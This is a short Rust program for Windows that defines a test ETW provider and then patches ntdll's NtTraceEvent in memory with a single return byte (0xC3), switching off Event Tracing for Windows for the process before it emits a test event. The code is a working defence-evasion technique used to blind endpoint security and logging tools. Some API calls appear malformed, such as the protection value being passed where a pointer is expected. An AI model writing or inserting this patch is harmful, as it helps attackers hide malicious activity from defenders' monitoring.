#![allow(dead_code)]

extern crate winapi;
extern crate kernel32;
use winapi::um::processthreadsapi::GetCurrentProcess;
use std::ptr::null_mut;
use std::process;
use win_etw_macros::trace_logging_provider;

#[trace_logging_provider(guid = "48016b7b-fd63-568f-036a-3af4fe0fa219")]
pub trait TestProviderEvents {
    fn test_event(description: &str);
}

fn patch_etw() {
    unsafe {
        println!("[+] Patching ETW");
        let modu = "ntdll.dll\0";
        let handle = kernel32::LoadLibraryA(modu.as_ptr() as *const i8);
        let mthd = "NtTraceEvent\0";
        let mini = kernel32::GetProcAddress(handle, mthd.as_ptr() as *const i8);
        let oldprotect : winapi::ctypes::c_ulong = 0;
        let hook = b"\xc3";
        kernel32::VirtualProtectEx(GetCurrentProcess() as *mut std::ffi::c_void,mini as *mut std::ffi::c_void,1,0x40,oldprotect);
        kernel32::WriteProcessMemory(GetCurrentProcess() as *mut std::ffi::c_void,mini as *mut std::ffi::c_void,hook.as_ptr() as *mut std::ffi::c_void,1,null_mut());
        kernel32::VirtualProtectEx(GetCurrentProcess() as *mut std::ffi::c_void,mini as *mut std::ffi::c_void,1,oldprotect,0x0);
    }
}

fn main() {
    let current_pid = process::id();
    println!("[+] Current process PID: {}", current_pid);

    let my_app_events = TestProviderEvents::new();
    patch_etw();
    //open_proc();
    my_app_events.test_event(None, "THIS IS A TEST EVENT FOR THE CUSTOM ETW PROVIDER");
}
